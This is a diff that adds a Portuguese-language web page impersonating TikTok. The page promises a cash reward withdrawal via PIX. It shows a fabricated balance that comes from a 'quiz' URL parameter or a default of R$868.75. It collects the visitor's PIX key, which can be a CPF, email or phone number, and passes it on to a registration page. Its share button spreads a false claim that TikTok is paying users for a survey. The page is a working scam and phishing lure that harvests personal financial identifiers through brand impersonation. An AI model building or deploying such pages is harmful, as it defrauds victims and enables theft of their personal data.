@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/params.js"></script>
+<script src="/api/tt.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Resgatar Recompensas — TikTok</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root{--bg:hsl(0,0%,97%);--card:hsl(0,0%,100%);--fg:hsl(0,0%,8%);--primary:hsl(346,97%,55%);--muted:hsl(220,14%,92%);--muted-fg:hsl(220,10%,45%);--border:hsl(220,13%,89%);--reward:hsl(142,71%,45%);--gold:hsl(43,96%,56%)}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Poppins',sans-serif;background:var(--bg);color:var(--fg);min-height:100vh;display:flex;flex-direction:column;align-items:center;-webkit-font-smoothing:antialiased}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.fu{animation:fadeUp .35s ease both}
+.d1{animation-delay:.05s}.d2{animation-delay:.1s}.d3{animation-delay:.15s}.d4{animation-delay:.2s}.d5{animation-delay:.25s}.d6{animation-delay:.3s}.d7{animation-delay:.35s}
+
+.card{width:100%;max-width:520px;background:var(--card)}
+@media(min-width:560px){.card{border-radius:1.5rem;margin:20px auto;box-shadow:0 25px 50px -12px rgb(0 0 0/.08)}}
+.inner{padding:20px}
+
+.top-nav{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.nav-btn{width:40px;height:40px;border-radius:.875rem;background:var(--muted);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s}
+.nav-btn:hover{background:hsl(220 14% 85%)}
+
+.bal-card{background:var(--fg);color:#fff;border-radius:1.25rem;padding:20px;margin-bottom:10px;position:relative;overflow:hidden}
+.bal-card::after{content:'';position:absolute;top:-16px;right:-16px;width:80px;height:80px;background:hsl(0 0% 100%/.06);border-radius:50%}
+.bal-sub{font-size:11px;opacity:.6;font-weight:600;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
+.bal-num{font-size:46px;font-weight:900;font-variant-numeric:tabular-nums;letter-spacing:-1px;line-height:1}
+.bal-confirm{font-size:12px;color:var(--primary);font-weight:600;margin-top:6px}
+
+
+.sec-title{font-size:17px;font-weight:800;margin-bottom:14px}
+.pix-lbl{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted-fg);margin-bottom:16px}
+
+.amt-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:20px}
+.amt-btn{padding:12px 4px;border-radius:1rem;border:2px solid var(--border);background:hsl(220 14% 92%/.6);font-size:13px;font-weight:800;color:var(--muted-fg);cursor:pointer;text-align:center;transition:all .18s;font-family:'Poppins',sans-serif}
+.amt-btn:hover{border-color:hsl(220 10% 45%/.4);color:var(--fg)}
+.amt-btn.active{background:var(--primary);color:#fff;border-color:var(--primary);box-shadow:0 20px 25px -5px hsl(346 97% 55%/.25);transform:scale(1.05)}
+
+.pix-inputs{display:flex;flex-direction:column;gap:12px;margin-bottom:8px}
+.pix-inputs select,.pix-inputs input{padding:14px 16px;border:2px solid var(--border);border-radius:1rem;font-size:14px;background:hsl(220 14% 92%/.3);color:var(--fg);font-family:'Poppins',sans-serif;outline:none;transition:border-color .18s;-webkit-appearance:none;appearance:none}
+.pix-inputs select:focus,.pix-inputs input:focus{border-color:var(--primary);background:var(--card);box-shadow:0 0 0 2px hsl(346 97% 55%/.1)}
+.pix-inputs input::placeholder{color:var(--muted-fg)}
+.pix-inputs select.error,.pix-inputs input.error{border-color:hsl(0 84% 60%)}
+.field-error{font-size:11px;color:hsl(0 84% 60%);font-weight:600;margin-top:-6px;margin-bottom:4px;padding-left:4px;display:none}
+.field-error.show{display:block}
+
+.pix-hint{font-size:11px;color:var(--muted-fg);padding-left:4px;margin-bottom:16px}
+
+.saque-btn{width:100%;background:var(--primary);color:#fff;border:none;border-radius:1rem;padding:17px;font-size:15px;font-weight:800;font-family:'Poppins',sans-serif;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 20px 25px -5px hsl(346 97% 55%/.25);transition:transform .15s;margin-bottom:10px}
+.saque-btn:active{transform:scale(.97)}
+.min-note{text-align:center;font-size:12px;color:var(--muted-fg);margin-bottom:24px}
+
+/* Invite card */
+.invite{background:linear-gradient(135deg,var(--primary),hsl(346 97% 42%));border-radius:1.5rem;padding:24px;margin-bottom:20px;color:#fff;position:relative;overflow:hidden}
+.invite::after{content:'';position:absolute;bottom:-24px;right:-24px;width:112px;height:112px;background:hsl(0 0% 100%/.06);border-radius:50%}
+.inv-meta{font-size:11px;opacity:.7;margin-bottom:8px}
+.inv-title{font-size:16px;font-weight:900;margin-bottom:6px;display:flex;align-items:center;gap:8px}
+.inv-title svg{width:18px;height:18px;flex-shrink:0}
+.inv-sub{font-size:13px;opacity:.7;margin-bottom:20px}
+.inv-badges{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:20px}
+.inv-badge{aspect-ratio:1;border-radius:1rem;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900;max-width:60px}
+.inv-badge.gold{background:var(--gold);color:hsl(0 0% 8%)}
+.inv-badge.dim{background:hsl(0 0% 100%/.15);color:hsl(0 0% 100%/.85)}
+.inv-btn{width:100%;background:var(--gold);color:hsl(0 0% 8%);border:none;border-radius:1rem;padding:14px;font-size:14px;font-weight:900;font-family:'Poppins',sans-serif;cursor:pointer;margin-bottom:14px;transition:transform .15s}
+.inv-btn:active{transform:scale(.97)}
+.inv-code{text-align:center;font-size:13px;opacity:.8;display:flex;align-items:center;justify-content:center;gap:8px}
+.copy-btn{background:none;border:none;cursor:pointer;opacity:.7;color:#fff;display:flex;align-items:center;transition:transform .15s}
+.copy-btn:hover{transform:scale(1.1)}
+
+/* FAQ */
+.faq{display:flex;flex-direction:column;gap:2px;margin-bottom:20px}
+.faq-item{background:hsl(220 14% 92%/.3);border-radius:1rem;overflow:hidden}
+.faq-q{width:100%;background:none;border:none;padding:14px 16px;font-size:13px;font-weight:700;font-family:'Poppins',sans-serif;color:var(--fg);text-align:left;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:8px}
+.faq-icon{font-size:16px;transition:transform .2s;flex-shrink:0}
+.faq-a{font-size:12px;color:var(--muted-fg);line-height:1.6;max-height:0;overflow:hidden;transition:max-height .3s ease,padding .3s ease;padding:0 16px}
+.faq-item.open .faq-a{max-height:200px;padding:0 16px 14px}
+.faq-item.open .faq-icon{transform:rotate(45deg)}
+
+.disc{text-align:center;font-size:11px;color:var(--muted-fg);padding-bottom:24px}
+.disc a{color:var(--primary);font-weight:600}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="inner">
+
+    <div class="top-nav fu d1">
+      <button class="nav-btn" onclick="history.back()">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      </button>
+      <svg xmlns="http://www.w3.org/2000/svg" width="102" height="30" viewBox="0 0 102 30" fill="none"><path d="M9.49351 21.3496L9.59191 21.6274C9.57631 21.5956 9.54031 21.4984 9.49351 21.3496ZM4.92397 19.3739C5.09676 17.8817 5.68356 17.0459 6.78934 16.1891C8.37152 15.0287 10.3479 15.6851 10.3479 15.6851V11.7905C10.8284 11.7782 11.309 11.8081 11.7843 11.8799V16.8905C11.7843 16.8905 9.80851 16.2341 8.22633 17.3945C7.12114 18.2513 6.53315 19.0877 6.36095 20.5798C6.35555 21.391 6.50135 22.4506 7.17274 23.3668C7.00674 23.278 6.83754 23.1768 6.66515 23.0632C5.18616 22.027 4.91677 20.473 4.92397 19.3739ZM19.9448 4.59063C18.8564 3.34625 18.4448 2.08986 18.296 1.20728H19.6652C19.6652 1.20728 19.3922 3.52145 21.3818 5.79722L21.4094 5.82782C20.8731 5.47589 20.3814 5.06049 19.9448 4.59063Z" fill="#EE1D52"/><path d="M26.5405 8.11923V13.029C26.5405 13.029 24.7933 12.9582 23.5003 12.6144C21.6949 12.1344 20.5346 11.3988 20.5346 11.3988C20.5346 11.3988 19.733 10.8732 19.6682 10.8372V20.9801C19.6682 21.5441 19.52 22.954 19.0682 24.1306C18.4784 25.669 17.5682 26.6788 17.4008 26.8846C17.4008 26.8846 16.2938 28.2502 14.3408 29.1694C12.5805 29.9986 11.0349 29.9776 10.5729 29.9986C10.5729 29.9986 7.90112 30.109 5.49695 28.4782C4.97685 28.1194 4.49153 27.7126 4.04736 27.2632L4.05936 27.2716C6.46413 28.9024 9.1353 28.792 9.1353 28.792C9.5979 28.771 11.1435 28.792 12.9033 27.9628C14.855 27.0436 15.9632 25.678 15.9632 25.678C16.1288 25.4722 17.0432 24.4624 17.6306 22.9234C18.0812 21.7475 18.2306 20.3375 18.2306 19.7729V9.63061C18.2954 9.66721 19.097 10.1928 19.097 10.1928C19.097 10.1928 20.2574 10.9296 22.0627 11.4084C23.3563 11.7516 25.1029 11.823 25.1029 11.823V7.97583C25.7005 8.11563 26.2099 8.15403 26.5405 8.11923Z" fill="#EE1D52"/><path d="M25.1035 7.97568V11.8222C25.1035 11.8222 23.3569 11.7508 22.0633 11.4076C20.2579 10.9276 19.0976 10.1921 19.0976 10.1921C19.0976 10.1921 18.296 9.66646 18.2312 9.62986V19.7703C18.2312 20.3349 18.083 21.7449 17.6312 22.9209C17.0414 24.4599 16.1312 25.4697 15.9638 25.6755C15.9638 25.6755 14.8568 27.041 12.9038 27.9602C11.1441 28.7894 9.59848 28.7684 9.13588 28.7894C9.13588 28.7894 6.46472 28.8998 4.05995 27.269L4.04795 27.2606C3.7942 27.004 3.55522 26.7332 3.33216 26.4495C2.56477 25.4727 2.09437 24.3189 1.97617 23.9895C1.97582 23.9881 1.97582 23.9867 1.97617 23.9853C1.78538 23.4123 1.38578 22.0383 1.44038 20.7069C1.53698 18.3574 2.32897 16.9162 2.53837 16.5544C3.09319 15.5696 3.81468 14.6885 4.67074 13.9504C5.42572 13.3129 6.28189 12.8059 7.20391 12.4504C7.77883 12.2115 8.37791 12.0355 8.99069 11.9254C9.4389 11.8453 9.89266 11.8002 10.3479 11.7904V15.6826C10.3479 15.6826 8.37149 15.0262 6.78931 16.1866C5.68353 17.0434 5.09673 17.8792 4.92394 19.3713C4.91674 20.4705 5.18613 22.0245 6.66392 23.0619C6.83591 23.1759 7.00511 23.2771 7.17151 23.3655C7.42987 23.7144 7.74386 24.0185 8.1009 24.2655C9.54448 25.2189 10.7541 25.2855 12.3008 24.6663C13.3334 24.2577 14.1068 23.3247 14.4734 22.2903C14.6996 21.6447 14.6966 20.9943 14.6966 20.3229V1.20776H18.2966C18.4454 2.09035 18.857 3.34674 19.9454 4.59112C20.382 5.06098 20.8737 5.47638 21.4099 5.82831C21.5683 5.99931 22.3783 6.84409 23.4181 7.36369C23.9545 7.63179 24.52 7.83715 25.1035 7.97568Z" fill="black"/><path d="M0.543457 22.7937V22.7973L0.632256 23.0499C0.622656 23.0205 0.589056 22.9311 0.543457 22.7937Z" fill="#69C9D0"/><path d="M7.20399 12.4504C6.28197 12.8059 5.4258 13.3129 4.67082 13.9504C3.8147 14.6903 3.09359 15.5732 2.53965 16.5598C2.33025 16.9198 1.53826 18.3628 1.44166 20.7123C1.38706 22.0437 1.78666 23.4177 1.97745 23.9907C2.09745 24.3213 2.56605 25.4751 3.33344 26.4549C3.5565 26.7386 3.79548 27.0094 4.04923 27.2661C3.23575 26.7035 2.51026 26.0233 1.89645 25.2477C1.13566 24.2799 0.666469 23.1375 0.544071 22.8003L0.541071 22.7931V22.7883C0.350273 22.2171 -0.0505217 20.8419 0.0052776 19.5088C0.101876 17.1592 0.893867 15.718 1.10326 15.3562C1.65705 14.3695 2.37818 13.4865 3.23444 12.7468C3.98926 12.1091 4.84547 11.6021 5.76761 11.2469C6.34253 11.0079 6.9416 10.8319 7.55438 10.7219C8.47772 10.5604 9.42083 10.5464 10.3485 10.6805V11.7905C9.89345 11.7988 9.43969 11.8425 8.99137 11.9213C8.37822 12.0326 7.77893 12.2101 7.20399 12.4504Z" fill="#69C9D0"/><path d="M18.296 1.20778H14.6961V20.3241C14.6961 20.9955 14.6991 21.6441 14.4729 22.2915C14.1093 23.3247 13.3359 24.2577 12.3051 24.6717C10.7577 25.2933 9.54815 25.2243 8.10517 24.2709C7.74813 24.0239 7.43415 23.7198 7.17578 23.3709C8.40517 24.0267 9.50555 24.0153 10.8687 23.4681C11.8935 23.0511 12.6735 22.1181 13.0335 21.0843C13.2603 20.4387 13.2573 19.7884 13.2573 19.1176V0H18.2282C18.2282 0 18.1718 0.475794 18.296 1.20778ZM25.1036 6.91252V7.9757C24.5199 7.83721 23.9542 7.63186 23.4176 7.36371C22.3778 6.84412 21.5678 5.99933 21.4094 5.82833C21.5931 5.94903 21.7838 6.05862 21.9806 6.15652C23.2448 6.78772 24.4868 6.97671 25.1036 6.91252Z" fill="#69C9D0"/><path d="M78.2959 16.8815C78.2958 17.1549 78.3362 17.4269 78.4159 17.6884C78.4204 17.707 78.426 17.7252 78.4327 17.743C78.6247 18.3618 79.0097 18.9029 79.5314 19.2871C80.0531 19.6714 80.684 19.8786 81.3319 19.8784V22.9504C79.8373 22.9504 78.7663 23.0026 77.1373 22.039C75.2774 20.9398 74.2322 18.9298 74.2322 16.8425C74.2322 14.6909 75.401 12.5339 77.3827 11.4953C78.8191 10.7417 79.9123 10.7363 81.3319 10.7363V13.8065C80.5267 13.8067 79.7546 14.1266 79.1853 14.6959C78.616 15.2652 78.2961 16.0373 78.2959 16.8425V16.8815Z" fill="#69C9D0"/><path d="M84.3912 16.8815C84.3916 17.1549 84.3512 17.4269 84.2712 17.6884C84.267 17.707 84.2614 17.7253 84.2544 17.743C84.0625 18.3619 83.6776 18.9031 83.1559 19.2874C82.6342 19.6716 82.0032 19.8788 81.3552 19.8784V22.9504C82.8504 22.9504 83.9208 23.0026 85.5498 22.039C87.4098 20.9398 88.4555 18.9298 88.4555 16.8425C88.4555 14.6909 87.2862 12.5339 85.305 11.4953C83.8686 10.7417 82.7748 10.7363 81.3552 10.7363V13.8065C82.1605 13.8065 82.9327 14.1263 83.5022 14.6957C84.0716 15.265 84.3916 16.0372 84.3918 16.8425L84.3912 16.8815Z" fill="#EE1D52"/><path d="M34.3369 7.95044H45.5814L44.5422 11.0446H41.6022V22.8849H37.9801V11.0446H34.3369V7.95044ZM64.1385 7.95044V11.0446H67.7817V22.8849H71.4015V11.0446H74.3414L75.383 7.95044H64.1385ZM48.0275 11.4766C48.3739 11.4766 48.7125 11.3739 49.0006 11.1814C49.2886 10.989 49.5131 10.7155 49.6456 10.3954C49.7782 10.0754 49.8128 9.72327 49.7453 9.38354C49.6777 9.04381 49.5109 8.73174 49.266 8.48681C49.021 8.24187 48.709 8.07507 48.3692 8.00749C48.0295 7.93991 47.6773 7.9746 47.3573 8.10716C47.0373 8.23971 46.7638 8.46419 46.5713 8.7522C46.3789 9.04022 46.2762 9.37883 46.2762 9.72522C46.2762 10.1897 46.4607 10.6352 46.7891 10.9636C47.1176 11.2921 47.5631 11.4766 48.0275 11.4766ZM46.2732 22.8849H49.8233V12.7144H46.2732V22.8849ZM62.593 11.389H58.4422L54.8645 14.9704V7.96184H51.3383L51.3263 22.8849H54.8879V18.9963L55.9972 17.9925L59.4532 22.8849H63.2602L58.2538 15.7299L62.593 11.389ZM96.6449 15.7299L100.986 11.389H96.8351L93.2574 14.9704V7.96184H89.7306L89.7192 22.8849H93.2808V18.9963L94.3926 17.9925L97.8491 22.8849H101.652L96.6449 15.7299ZM87.5191 16.8423C87.5191 20.2149 84.7483 22.9491 81.3301 22.9491C77.912 22.9491 75.1418 20.2149 75.1418 16.8423C75.1418 13.4698 77.9126 10.7356 81.3301 10.7356C84.7477 10.7356 87.5203 13.4704 87.5203 16.8423H87.5191ZM84.3661 16.8423C84.3661 16.2419 84.188 15.6549 83.8544 15.1556C83.5208 14.6564 83.0467 14.2673 82.492 14.0375C81.9372 13.8077 81.3268 13.7476 80.7379 13.8647C80.1489 13.9818 79.608 14.271 79.1834 14.6956C78.7588 15.1202 78.4697 15.6611 78.3525 16.25C78.2354 16.839 78.2955 17.4494 78.5253 18.0041C78.7551 18.5589 79.1442 19.033 79.6434 19.3666C80.1427 19.7002 80.7297 19.8783 81.3301 19.8783C82.1597 19.8783 82.9554 19.5496 83.5437 18.9614C84.132 18.3731 84.4607 17.5774 84.4607 16.7478L84.3661 16.8423Z" fill="black"/></svg>
+      <button class="nav-btn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+      </button>
+    </div>
+
+    <div class="bal-card fu d2">
+      <div class="bal-sub">Seu saldo disponível</div>
+      <div class="bal-num" id="balNum">R$868,75</div>
+      <div class="bal-confirm">✓ Saldo selecionado para saque</div>
+    </div>
+
+
+    <div class="fu d4">
+      <div class="sec-title">Sacar dinheiro</div>
+      <div class="pix-lbl"><span style="font-size:20px">🏦</span><span>Transferência bancária / PIX</span></div>
+      <div class="amt-grid" id="amt-grid"></div>
+
+      <div class="pix-inputs">
+        <select id="pixType" onchange="onPixTypeChange()">
+          <option value="" disabled selected>Selecione o tipo de chave:</option>
+          <option value="cpf">CPF</option>
+          <option value="email">E-mail</option>
+          <option value="phone">Telefone</option>
+          <option value="random">Chave Aleatória</option>
+        </select>
+        <div class="field-error" id="typeErr">Selecione o tipo de chave PIX</div>
+        <input type="text" id="pixKey" placeholder="Digite a sua chave PIX" oninput="onPixInput()">
+        <div class="field-error" id="keyErr">Chave PIX inválida</div>
+      </div>
+      <div class="pix-hint" id="pixHint">Selecione o tipo de chave para ver o formato esperado</div>
+
+      <button class="saque-btn" onclick="doSaque()">
+        Realizar Saque
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="m9 18 6-6-6-6"/></svg>
+      </button>
+      <p class="min-note">Para sacar o seu dinheiro, você precisa de um saldo mínimo de R$ 1,50.</p>
+    </div>
+
+    <div class="invite fu d5">
+      <div class="inv-meta" id="inv-meta">Campanha ativa</div>
+      <div class="inv-title">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+        Convide amigos para ganhar até R$2.125
+      </div>
+      <div class="inv-sub">Convidar. Ganhar recompensas. Repetir!</div>
+      <div class="inv-badges">
+        <div class="inv-badge gold">R$215</div>
+        <div class="inv-badge dim">R$215</div>
+        <div class="inv-badge dim">R$215</div>
+        <div class="inv-badge dim">R$215</div>
+      </div>
+      <button class="inv-btn" onclick="doShare()">CONVIDAR AMIGOS</button>
+      <div class="inv-code">
+        Código de convite: <strong id="invCode">—</strong>
+        <button class="copy-btn" id="copyBtn">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+        </button>
+      </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="sec-title fu d6">Dúvidas frequentes</div>
+    <div class="faq fu d6" id="faq">
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">Quando o dinheiro cai na minha conta?<span class="faq-icon">+</span></button>
+        <div class="faq-a">O saque é processado em até 24 horas úteis após a confirmação. Na maioria dos casos o Pix cai em poucos minutos.</div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">Tem alguma taxa para sacar?<span class="faq-icon">+</span></button>
+        <div class="faq-a">Não. O saque é 100% gratuito e sem taxas. O valor que aparece no seu saldo é exatamente o que você recebe.</div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">Qual o valor máximo por saque?<span class="faq-icon">+</span></button>
+        <div class="faq-a">Não há limite máximo por saque. Você pode sacar todo o seu saldo de uma vez.</div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">Minha chave PIX precisa estar cadastrada no banco?<span class="faq-icon">+</span></button>
+        <div class="faq-a">Sim. A chave PIX precisa estar ativa e vinculada a uma conta bancária válida no Brasil para receber o pagamento.</div>
+      </div>
+    </div>
+
+    <div class="disc fu d7">Ao continuar, você concorda com os <a href="#">Termos e Condições</a> do TikTok.</div>
+  </div>
+</div>
+
+<script>
+(function(){
+  // ─── Lê params da URL ───────────────────────────────────────────
+  const params = new URLSearchParams(window.location.search);
+
+  // Saldo vindo do quiz
+  const totalParam = parseFloat(params.get('total'));
+  const balance = (!isNaN(totalParam) && totalParam > 0) ? totalParam : 868.75;
+
+  // Formata
+  function fmt(v){ return 'R$' + v.toFixed(2).replace('.', ','); }
+
+  // Preenche saldo e última recompensa
+  document.getElementById('balNum').textContent = fmt(balance);
+
+  // ─── Botões de valor dinâmicos ──────────────────────────────────
+  const amts = [50, 150, 250, Math.floor(balance)];
+  const grid = document.getElementById('amt-grid');
+  amts.forEach((a, i) => {
+    const b = document.createElement('button');
+    const isTotal = i === 3;
+    b.className = 'amt-btn' + (isTotal ? ' active' : ' disabled-amt');
+    b.textContent = isTotal ? fmt(balance) : fmt(a);
+    b.disabled = !isTotal;
+    b.style.opacity = isTotal ? '1' : '0.35';
+    b.style.cursor = isTotal ? 'pointer' : 'not-allowed';
+    b.title = isTotal ? '' : 'Complete o saque do saldo total';
+    grid.appendChild(b);
+  });
+
+  // ─── Código de convite aleatório por sessão ─────────────────────
+  let code = sessionStorage.getItem('inv_code');
+  if(!code){
+    code = Math.floor(10000000 + Math.random() * 89999999).toString();
+    sessionStorage.setItem('inv_code', code);
+  }
+  document.getElementById('invCode').textContent = code;
+  document.getElementById('copyBtn').onclick = () => {
+    navigator.clipboard.writeText(code).then(() => {
+      const btn = document.getElementById('copyBtn');
+      btn.style.opacity = '1';
+      setTimeout(() => btn.style.opacity = '.7', 1000);
+    });
+  };
+
+  // ─── Data de campanha dinâmica ──────────────────────────────────
+  const now = new Date();
+  const end = new Date(now.getFullYear(), now.getMonth() + 1, 0); // último dia do mês
+  const months = ['jan','fev','mar','abr','mai','jun','jul','ago','set','out','nov','dez'];
+  document.getElementById('inv-meta').textContent =
+    `1 de ${months[now.getMonth()]} – ${end.getDate()} de ${months[end.getMonth()]}`;
+
+  // ─── Validação de chave PIX ─────────────────────────────────────
+  const hints = {
+    cpf: 'Formato: 000.000.000-00 ou 00000000000',
+    email: 'Formato: seu@email.com',
+    phone: 'Formato: (11) 99999-9999 ou +5511999999999',
+    random: 'Formato: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx'
+  };
+
+  const masks = {
+    cpf: v => v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').slice(0,14),
+    phone: v => v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').slice(0,15),
+    email: v => v,
+    random: v => v
+  };
+
+  const validators = {
+    cpf: v => /^\d{3}\.\d{3}\.\d{3}-\d{2}$/.test(v) || /^\d{11}$/.test(v.replace(/\D/g,'')),
+    email: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
+    phone: v => v.replace(/\D/g,'').length >= 10,
+    random: v => /^[0-9a-f-]{36}$/i.test(v) || v.length > 8
+  };
+
+  window.onPixTypeChange = function(){
+    const t = document.getElementById('pixType').value;
+    document.getElementById('pixHint').textContent = hints[t] || '';
+    document.getElementById('pixKey').value = '';
+    document.getElementById('pixType').classList.remove('error');
+    document.getElementById('typeErr').classList.remove('show');
+    document.getElementById('keyErr').classList.remove('show');
+    document.getElementById('pixKey').classList.remove('error');
+  };
+
+  window.onPixInput = function(){
+    const t = document.getElementById('pixType').value;
+    const input = document.getElementById('pixKey');
+    if(t && masks[t]) input.value = masks[t](input.value);
+    input.classList.remove('error');
+    document.getElementById('keyErr').classList.remove('show');
+  };
+
+  window.doSaque = function(){
+    const t = document.getElementById('pixType').value;
+    const key = document.getElementById('pixKey').value.trim();
+    let valid = true;
+
+    if(!t){
+      document.getElementById('pixType').classList.add('error');
+      document.getElementById('typeErr').classList.add('show');
+      valid = false;
+    }
+    if(!key || (t && !validators[t]?.(key))){
+      document.getElementById('pixKey').classList.add('error');
+      document.getElementById('keyErr').textContent = !key ? 'Digite sua chave PIX' : 'Chave PIX inválida para o tipo selecionado';
+      document.getElementById('keyErr').classList.add('show');
+      valid = false;
+    }
+    if(!valid) return;
+
+    const dest = new URL('registration.html', window.location.href);
+    new URLSearchParams(window.location.search).forEach((v,k) => dest.searchParams.set(k,v));
+    dest.searchParams.set('pix_type', t);
+    dest.searchParams.set('pix_key', key);
+    window.location.href = dest.toString();
+  };
+
+  // ─── Web Share / Convite ───────────────────────────────────────
+  window.doShare = function(){
+    const shareUrl = window.location.origin + window.location.pathname.replace('withdraw.html','') + 'index.html?ref=' + code;
+    const shareText = '🎁 O TikTok está pagando usuários para responder uma pesquisa! Eu já recebi meu Pix. Usa meu código ' + code + ' e garanta o seu:';
+    if(navigator.share){
+      navigator.share({ title: 'Programa de Recompensas TikTok', text: shareText, url: shareUrl })
+        .catch(()=>{});
+    } else {
+      // Fallback — copia link+código
+      navigator.clipboard.writeText(shareText + ' ' + shareUrl).then(()=>{
+        alert('Link copiado! Cole no WhatsApp ou onde quiser.');
+      });
+    }
+  };
+
+  // ─── FAQ accordion ──────────────────────────────────────────────
+  window.toggleFaq = function(btn){
+    const item = btn.closest('.faq-item');
+    const isOpen = item.classList.contains('open');
+    document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
+    if(!isOpen) item.classList.add('open');
+  };
+
+})();
+</script>
+
+</body>
+</html>
